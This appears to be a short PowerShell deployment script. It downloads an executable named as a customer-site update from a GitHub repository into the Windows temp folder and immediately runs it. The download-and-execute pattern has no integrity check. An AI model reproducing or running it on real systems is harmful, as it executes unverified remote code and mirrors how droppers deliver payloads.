$url = "https://github.com/murtaza7869/Deploy/raw/master/UpdateCustomerSiteMay21.exe"
$output = "C:\Windows\temp\UpdateCustomerSiteMay21.exe"
$wc = new-object System.Net.WebClient
$wc.DownloadFile($url, $output)
Start-Process -FilePath "C:\Windows\temp\UpdateCustomerSiteMay21.exe"